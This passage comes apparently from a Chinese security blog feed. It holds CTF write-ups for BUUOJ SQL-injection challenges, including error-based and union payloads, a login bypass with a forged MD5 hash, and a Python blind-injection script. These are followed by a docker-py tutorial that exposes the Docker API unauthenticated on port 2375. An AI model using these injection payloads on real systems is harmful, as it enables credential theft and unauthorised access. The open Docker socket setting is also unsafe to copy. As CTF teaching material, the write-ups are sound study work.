?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;H4rDsq1&#x27;</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>

?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre>

<p>这里会发现flag显示不全，可能是报错现实的字数限制，利用right&#x2F;left函数，显示部分的flag，之后拼接起来</p>
<p>显示后面的flag</p>
<pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(right(<span class="hljs-keyword">password</span>,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre>



<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>sql注入+反序列化+代码审计</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>下载的源码，有助于后面做题</p>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);
<span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];
<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];
<span class="hljs-variable">$t_pw</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>);     <span class="hljs-comment">//对传入的password参数进行了md5加密</span>
<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;
<span class="hljs-comment">// echo $sql;</span>
<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);

<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;  <span class="hljs-comment">//  过滤了() | = or </span>
	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack me!&quot;</span>);
&#125;
<span class="hljs-keyword">else</span>&#123;
	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;
		<span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con</span>));
		<span class="hljs-keyword">exit</span>();
	&#125;
	<span class="hljs-keyword">else</span>&#123;
		<span class="hljs-comment">// echo &#x27;&lt;pre&gt;&#x27;;</span>
		<span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$result</span>);
		<span class="hljs-comment">// print_r($arr);</span>
		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;
			<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;    <span class="hljs-comment">//</span>
				<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
			&#125;
			<span class="hljs-keyword">else</span>&#123;
				<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong pass!&quot;</span>);
			&#125;
		&#125;
		<span class="hljs-keyword">else</span>&#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user!&quot;</span>);
		&#125;
	&#125;
&#125;</code></pre>

<p>随便输入用户名和密码，查看源码，出现提示</p>
<p><img src="https://i.loli.net/2020/11/30/yMceIJS4DYLHsh6.png"></p>
<p>试了试应该是base32，解码后是base64</p>
<pre><code class="hljs abnf"><span class="hljs-attribute">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span></code></pre>

<p>继续解码</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span></code></pre>

<p>注入点是name参数这里，与上面源码中的查询语句一样。</p>
<p>经过测试发现有三列，<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>显示正常，<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>报错</p>
<p>但是页面没有数字回显，所以常规的注入应该是不行的。</p>
<p>值得注意的是，这题可以知道username是admin，</p>
<p>输入username&#x3D;admin&amp;password&#x3D;11,时提示wrong pass!</p>
<p>输入username&#x3D;admn&amp;password&#x3D;11,时提示wrong user!，所以可以判断用户名为admin</p>
<p>接下来介绍一种新的union注入</p>
<p>先建立一张表</p>
<p><img src="https://i.loli.net/2020/11/30/9bS4DTXuCfmxykg.png"></p>
<pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=0 union <span class="hljs-keyword">select</span> 1,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;2322&#x27;</span>;</code></pre>

<p>union语句后查询的是表中不存在的一个数据，查询结果如下</p>
<p><img src="https://i.loli.net/2020/11/30/n6EeYVXdCxH72oO.png"></p>
<p><strong>这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表</strong>，其中放着所查询到的数据和union后包含的数据</p>
<p>这里就是 id&#x3D;1,username&#x3D;admin,password&#x3D;2322</p>
<p>这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录</p>
<p>接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了</p>
<p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong user!</p>
<p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong pass!</p>
<p>第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容<strong>（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知）</strong></p>
<p>payload:</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=000&#x27;union select 1,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;b59c67bf196a4758191e42f76670ceba&#x27;</span>#&amp;<span class="hljs-attribute">pw</span>=1111</code></pre>

<p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
<p><img src="https://i.loli.net/2020/11/30/Xhp1PgH7QlejDYn.png"></p>
<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>与hard sql是一个系列的，但是这个应该是盲注</p>
<p>在search.php中找到注入点，测试可以发现是数字型注入</p>
<p> fuzz之后可以发现对于不同的字符，回显不同，并且过滤了空格，但是<code>^</code>没有被过滤，所以可以利用这个符号</p>
<p>可以看到当id &#x3D; 1 时，页面回显为，可以将这个为判断的标志</p>
<p><img src="https://i.loli.net/2020/12/23/DO6SQjuJLqm9ycM.png" alt="image-20201223090038080"></p>
<pre><code class="hljs apache"><span class="hljs-attribute">1</span>^<span class="hljs-number">1</span>^<span class="hljs-number">1</span> = <span class="hljs-number">1</span>
<span class="hljs-attribute">1</span>^<span class="hljs-number">0</span>^<span class="hljs-number">1</span> = <span class="hljs-number">0</span></code></pre>

<p>所以可以将注入的payload加到中间，例如</p>
<pre><code class="hljs perl"><span class="hljs-number">1</span>^(<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(group_concat(schema_name))from(information_schema.schema
ta)),%d,<span class="hljs-number">1</span>))=%d)^<span class="hljs-number">1</span><span class="hljs-string">&quot;%(i,ord(j))</span></code></pre>

<p>注入脚本如下，使用的是二分法</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

url = <span class="hljs-string">&quot;http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php&quot;</span>
flag = <span class="hljs-string">&#x27;&#x27;</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">payload</span>(<span class="hljs-params">i, j</span>):
    time.sleep(<span class="hljs-number">1</span>)
    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span>
    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span>
    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span>
    sql = <span class="hljs-string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)
    data = &#123;<span class="hljs-string">&quot;id&quot;</span>: sql&#125;
    r = requests.get(url, params=data)
    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Click&quot;</span> <span class="hljs-keyword">in</span> r.text:
        res = <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>:
        res = <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> res

<span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():
    <span class="hljs-keyword">global</span> flag
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>):
        <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&#x27;:&#x27;</span>)
        low = <span class="hljs-number">31</span>
        high = <span class="hljs-number">127</span>
        <span class="hljs-keyword">while</span> low &lt;= high:
            mid = (low + high) // <span class="hljs-number">2</span>
            res = payload(i, mid)
            <span class="hljs-keyword">if</span> res:
                low = mid + <span class="hljs-number">1</span>
            <span class="hljs-keyword">else</span>:
                high = mid - <span class="hljs-number">1</span>
        f = <span class="hljs-built_in">int</span>((low + high + <span class="hljs-number">1</span>)) // <span class="hljs-number">2</span>
        <span class="hljs-keyword">if</span> (f == <span class="hljs-number">127</span> <span class="hljs-keyword">or</span> f == <span class="hljs-number">31</span>):
            <span class="hljs-keyword">break</span>
        <span class="hljs-comment"># print (f)</span>
        flag += <span class="hljs-built_in">chr</span>(f)
        <span class="hljs-built_in">print</span>(flag)
exp()
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)</code></pre>

<p>又学到了新的注入姿势，真不错</p>
<p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12305052.html">https://www.cnblogs.com/wangtanzhi/p/12305052.html</a></p>
]]></content>
      <categories>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>二分注入</tag>
        <tag>报错注入</tag>
        <tag>union新姿势</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerpy</title>
    <url>/2022/05/15/dockerpy/</url>
    <content><![CDATA[<h1 id="Docker-py"><a href="#Docker-py" class="headerlink" title="Docker-py"></a>Docker-py</h1><p>使用python第三方库docker-py操作docker</p>
<p>docker-py的地址：<a href="https://github.com/docker/docker-py">https://github.com/docker/docker-py</a></p>
<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><h3 id="1-安装docker-py"><a href="#1-安装docker-py" class="headerlink" title="1.安装docker-py"></a>1.安装docker-py</h3><p>​	pip安装即可，安装最新版</p>
<pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> docker</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135319833.png" alt="image-20220515135319833"></p>
<h3 id="2-配置docker"><a href="#2-配置docker" class="headerlink" title="2.配置docker"></a>2.配置docker</h3><p>本文使用的是Docker Desktop，docker版本是<code>20.10.12</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135534992.png" alt="image-20220515135534992"></p>
<h4 id="docker开启远程访问"><a href="#docker开启远程访问" class="headerlink" title="docker开启远程访问"></a>docker开启远程访问</h4><p>对于Docker Desktop来说，开启远程访问很简单，只需要再settings中选中如下配置项</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140305267.png" alt="image-20220515140305267"> </p>
<p>对于linux中配置远程访问就稍微麻烦一点</p>
<p><strong>方法一</strong></p>
<p>在&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;docker.service，配置远程访问。</p>
<p>主要是在[Service]这个部分，加上下面两个参数</p>
<pre><code class="hljs ini"><span class="hljs-comment"># vim /usr/lib/systemd/system/docker.service</span>
<span class="hljs-section">[Service]</span>
<span class="hljs-attr">ExecStart</span>=
<span class="hljs-attr">ExecStart</span>=/usr/bin/dockerd -H tcp://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span> -H unix://var/run/docker.sock</code></pre>

<p>重启</p>
<pre><code class="hljs undefined">systemctl daemon-reload
systemctl restart docker</code></pre>

<p><strong>方法二</strong></p>
<p>修改<code>daemon.json</code>的配置</p>
<pre><code class="hljs bash">vim /etc/docker/daemon.json

&#123;
  <span class="hljs-string">&quot;hosts&quot;</span>: [<span class="hljs-string">&quot;tcp://0.0.0.0:2375&quot;</span>, <span class="hljs-string">&quot;unix:///var/run/docker.sock&quot;</span>]
&#125;</code></pre>

<blockquote>
<p>“unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock”：unix socket，本地客户端将通过这个来连接 Docker Daemon。<br>“tcp:&#x2F;&#x2F;0.0.0.0:2375”：tcp socket，表示允许任何远程客户端通过 2375 端口连接 Docker Daemon。</p>
</blockquote>
<p>修改配置以后</p>
<p>然后让docker重新读取配置文件,并重启docker服务</p>
<pre><code class="hljs undefined">systemctl daemon-reload
systemctl restart docker</code></pre>

<p>查看docker进程：</p>
<pre><code class="hljs perl">[root@slaver2 ~]<span class="hljs-comment"># ps -ef|grep docker</span>
root      <span class="hljs-number">44221</span>      <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> /usr/bin/dockerd -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">2375</span> -H unix:<span class="hljs-regexp">//</span>var/run/docker.sock</code></pre>

<p>Docker守护进程打开一个HTTP Socket,这样才能实现远程通信</p>
<p>当开启远程访问后，可以再浏览器中查看docker服务器上的相关信息，并且该API遵循RESTful API标准</p>
<ul>
<li><p>查看当前版本：<a href="http://ip:2375/version">http://IP:2375/version</a></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141120592.png" alt="image-20220515141120592"></p>
</li>
<li><p>查看所有镜像信息：<a href="http://ip:2375/images/json">http://IP:2375/images/json</a></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140906433.png" alt="image-20220515140906433"></p>
</li>
<li><p>查看已启动容器信息：<a href="http://127.0.0.1:2375/containers/json">http://127.0.0.1:2375/containers/json</a></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141343749.png" alt="image-20220515141343749"></p>
</li>
<li><p>查看网卡信息： <a href="http://127.0.0.1:2375/networks/">http://127.0.0.1:2375/networks/</a></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141509777.png" alt="image-20220515141509777"></p>
</li>
</ul>
<h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><h5 id="Docker-Desktop与VM冲突"><a href="#Docker-Desktop与VM冲突" class="headerlink" title="Docker Desktop与VM冲突"></a>Docker Desktop与VM冲突</h5><p>需要注意的是，安装Docker Desktop 后VM就无法使用，原因：</p>
<blockquote>
<p>1、Device Guard或Credential Guard与Workstation不兼容。</p>
<p>2、Windows系统的Hyper-V不兼容导致</p>
</blockquote>
<p>解决方法如<a href="https://blog.csdn.net/qq_36761831/article/details/81175736">https://blog.csdn.net/qq_36761831/article/details/81175736</a></p>
<p>开启和关闭Hyper-V</p>
<pre><code class="hljs shell">bcdedit /set hypervisorlaunchtype auto
bcdedit /set hypervisorlaunchtype off</code></pre>

<p>当需要使用VM时，执行关闭Hyper-V命令即可</p>
<h5 id="配置国内镜像源"><a href="#配置国内镜像源" class="headerlink" title="配置国内镜像源"></a>配置国内镜像源</h5><p>settings&#x3D;&gt;Dokcer engine修改配置内容</p>
<pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>
  <span class="hljs-attr">&quot;builder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
    <span class="hljs-attr">&quot;gc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
      <span class="hljs-attr">&quot;defaultKeepStorage&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;20GB&quot;</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
    <span class="hljs-punctuation">&#125;</span>
  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;experimental&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;features&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
    <span class="hljs-attr">&quot;buildkit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;registry-mirrors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">&quot;https://registry.docker-cn.com&quot;</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">&quot;http://hub-mirror.c.163.com&quot;</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">&#125;</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141737016.png" alt="image-20220515141737016"></p>
<h5 id="docker配置软链接"><a href="#docker配置软链接" class="headerlink" title="docker配置软链接"></a>docker配置软链接</h5><p>由于Docker Desktop默认安装在C盘，所以下载的镜像也都保存在C盘，由于镜像文件一般很大，很容易爆盘，所以需要为保存镜像的文件夹创建一个软链接，将镜像保存到其他盘。<a href="https://zhuanlan.zhihu.com/p/343278599">参考</a></p>
<p>请务必先关闭docker 或者docker desktop</p>
<ul>
<li>通过Everything或者资源管理器找到以.vhdx结尾的文件所在的位置，这些就是docker镜像路径：</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/v2-affd20a39ee0002a4c880ff3eb4e75f7_720w.jpg" alt="img"></p>
<ul>
<li>将.vhdx复制到想要的路径下，本文路径为：</li>
</ul>
<p><img src="https://pic1.zhimg.com/80/v2-70f80706f26839ff0dd3a4fcdc0aca80_720w.jpg" alt="img"></p>
<ul>
<li><p>删除源文件夹，本文是data文件夹</p>
</li>
<li><p>以管理员运行cmd并且使用以下命令创建链接：</p>
<pre><code class="hljs shell">mklink /J C:\Users\admin\AppData\Local\Docker\wsl\data   D:\docker\data</code></pre>

<p>请大家自行替换路径，本文路径分别为源路径：C:\Users\admin\AppData\Local\Docker\wsl\data</p>
<p>以及想要移动的路径：D:\docker\data此时可以在源路径看到新建出来的文件夹</p>
</li>
</ul>
<h2 id="使用dockerpy"><a href="#使用dockerpy" class="headerlink" title="使用dockerpy"></a>使用dockerpy</h2><p>官方给出了详细的说明文档<a href="https://docker-py.readthedocs.io/en/stable/index.html">说明文档</a>，下面只给出几个常见的操作</p>
<h3 id="image相关操作"><a href="#image相关操作" class="headerlink" title="image相关操作"></a>image相关操作</h3><p>进入docker库的imges.py中可以看到与镜像相关的所有操作，包括在shell中使用的build、pull、push、search等操作</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515144118231.png" alt="image-20220515144118231"></p>
<h4 id="list"><a href="#list" class="headerlink" title="list()"></a>list()</h4><p>查看源码，可知有三个可选参数</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">list</span>(<span class="hljs-params">self, name=<span class="hljs-literal">None</span>, <span class="hljs-built_in">all</span>=<span class="hljs-literal">False</span>, filters=<span class="hljs-literal">None</span></span>):
    <span class="hljs-string">&quot;&quot;&quot;</span>
<span class="hljs-string">    List images on the server.</span>
<span class="hljs-string"></span>
<span class="hljs-string">    Args:</span>
<span class="hljs-string">        name (str): Only show images belonging to the repository ``name``</span>
<span class="hljs-string">        all (bool): Show intermediate image layers. By default, these are</span>
<span class="hljs-string">            filtered out.</span>
<span class="hljs-string">        filters (dict): Filters to be processed on the image list.</span>
<span class="hljs-string">            Available filters:</span>
<span class="hljs-string">            - ``dangling`` (bool)</span>
<span class="hljs-string">            - ``label`` (str): format either ``key`` or ``key=value``</span>
<span class="hljs-string"></span>
<span class="hljs-string">    Returns:</span>
<span class="hljs-string">        (list of :py:class:`Image`): The images.</span>
<span class="hljs-string"></span>
<span class="hljs-string">    Raises:</span>
<span class="hljs-string">        :py:class:`docker.errors.APIError`</span>
<span class="hljs-string">            If the server returns an error.</span>
<span class="hljs-string">    &quot;&quot;&quot;</span>
    resp = self.client.api.images(name=name, <span class="hljs-built_in">all</span>=<span class="hljs-built_in">all</span>, filters=filters)
    <span class="hljs-keyword">return</span> [self.get(r[<span class="hljs-string">&quot;Id&quot;</span>]) <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> resp]</code></pre>

<h5 id="获取所有镜像"><a href="#获取所有镜像" class="headerlink" title="获取所有镜像"></a>获取所有镜像</h5><pre><code class="hljs python"><span class="hljs-keyword">import</span> docker

client = docker.from_env()
imagesList = client.images.<span class="hljs-built_in">list</span>()
<span class="hljs-built_in">print</span>(imagesList)</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515143446882.png" alt="image-20220515143446882"></p>
<h4 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h4><p>该函数只有一个参数name，镜像名称</p>
<p>获取指定名称的镜像</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> docker
client = docker.from_env()
mysqlImage = client.images.get(<span class="hljs-string">&quot;mysql&quot;</span>)
<span class="hljs-built_in">print</span>(mysqlImage)</code></pre>

<h4 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h4><p>与docker search 命令相同</p>
<pre><code class="hljs stylus">searchList = client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.search</span>(<span class="hljs-string">&quot;nginx&quot;</span>)
<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(searchList)</span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515153818793.png" alt="image-20220515153818793"></p>
<h4 id="pull"><a href="#pull" class="headerlink" title="pull()"></a>pull()</h4><p>作用等同于docker pull</p>
<pre><code class="hljs stylus">client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.pull</span>(<span class="hljs-string">&quot;nginx&quot;</span>)</code></pre>

<h3 id="container相关操作"><a href="#container相关操作" class="headerlink" title="container相关操作"></a>container相关操作</h3><p>容器相关的操作很多</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515161345640.png" alt="image-20220515161345640"></p>
<h4 id="run"><a href="#run" class="headerlink" title="run()"></a>run()</h4><p>官方注释</p>
<pre><code class="hljs lasso">Run a container. <span class="hljs-keyword">By</span> default, it will wait for the container <span class="hljs-keyword">to</span> finish
<span class="hljs-literal">and</span> <span class="hljs-keyword">return</span> its logs, similar <span class="hljs-keyword">to</span> <span class="hljs-string">``</span>docker run<span class="hljs-string">``</span>.
<span class="hljs-comment">// </span>
<span class="hljs-keyword">If</span> the <span class="hljs-string">``</span>detach<span class="hljs-string">``</span> argument is <span class="hljs-string">``</span><span class="hljs-literal">True</span><span class="hljs-string">``</span>, it will start the container
<span class="hljs-literal">and</span> immediately <span class="hljs-keyword">return</span> a :py:class:<span class="hljs-string">`Container`</span> object, similar <span class="hljs-keyword">to</span>
<span class="hljs-string">``</span>docker run <span class="hljs-params">-d</span><span class="hljs-string">``</span>.</code></pre>



<pre><code class="hljs python">port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;
image_name = nginx
client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 以守护进程的方式创建容器，容器停止后不会删除</span>

```
- The port number, <span class="hljs-keyword">as</span> an integer. For example,
``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;`` will expose port <span class="hljs-number">2222</span> inside the
container <span class="hljs-keyword">as</span> port <span class="hljs-number">3333</span> on the host.
- ``<span class="hljs-literal">None</span>``, to assign a random host port. For example,
``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-literal">None</span>&#125;``.
- A <span class="hljs-built_in">tuple</span> of ``(address, port)`` <span class="hljs-keyword">if</span> you want to specify the
host interface. For example,
``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1111</span>)&#125;``.
- A <span class="hljs-built_in">list</span> of integers, <span class="hljs-keyword">if</span> you want to bind multiple host ports
to a single container port. For example,
``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: [<span class="hljs-number">1234</span>, <span class="hljs-number">4567</span>]&#125;``.
```</code></pre>

<h4 id="get-1"><a href="#get-1" class="headerlink" title="get()"></a>get()</h4><p>获取容器对象</p>
<pre><code class="hljs python">docker_container_id = <span class="hljs-string">&quot;236efe761aeb&quot;</span>
container = client.containers.get(docker_container_id)
<span class="hljs-built_in">print</span>(container.<span class="hljs-built_in">id</span>)
<span class="hljs-built_in">print</span>(container.attrs) <span class="hljs-comment"># 获取容器的详细信息</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515163148958.png" alt="image-20220515163148958"></p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>进入容器内部执行命令，与下面的命令作用相同</p>
<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> containerID bash</code></pre>

<pre><code class="hljs python">command = <span class="hljs-string">&#x27;touch /tmp/flag&#x27;</span> 
port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;
image_name = nginx
container = client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  
container.exec_run(command)</code></pre>



<h3 id="network相关操作"><a href="#network相关操作" class="headerlink" title="network相关操作"></a>network相关操作</h3><h4 id="create"><a href="#create" class="headerlink" title="create"></a>create</h4><p>使用默认参数，桥接模式创建网卡</p>
<pre><code class="hljs python">client.networks.create(<span class="hljs-string">&quot;net1&quot;</span>, driver=<span class="hljs-string">&quot;bridge&quot;</span>)</code></pre>

<p>使用自定义IPAM配置创建更高级的网络。例如，将子网设置为192.168.52.0&#x2F;24和网关地址为192.168.52.254</p>
<pre><code class="hljs routeros">ipam_pool = docker.types.IPAMPool(
    <span class="hljs-attribute">subnet</span>=<span class="hljs-string">&#x27;192.168.52.0/24&#x27;</span>,
